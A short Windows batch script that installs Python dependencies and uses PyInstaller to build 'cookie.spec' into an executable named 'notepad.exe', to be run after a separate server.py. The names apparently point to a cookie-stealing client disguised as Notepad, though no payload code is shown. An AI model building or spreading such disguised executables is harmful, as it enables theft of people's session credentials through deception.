@echo off
echo [*] Installing dependencies...
pip install -r requirements.txt
if %errorlevel% neq 0 (
    echo [!] Failed to install requirements
    pause
    exit /b 1
)

echo [*] Building executable with PyInstaller...
python -m PyInstaller cookie.spec
if %errorlevel% neq 0 (
    echo [!] Failed to build executable
    pause
    exit /b 1
)

echo [+] Build successful! Executable created as 'dist/notepad.exe'
echo [+] Usage: Start server.py first, then run dist/notepad.exe
pause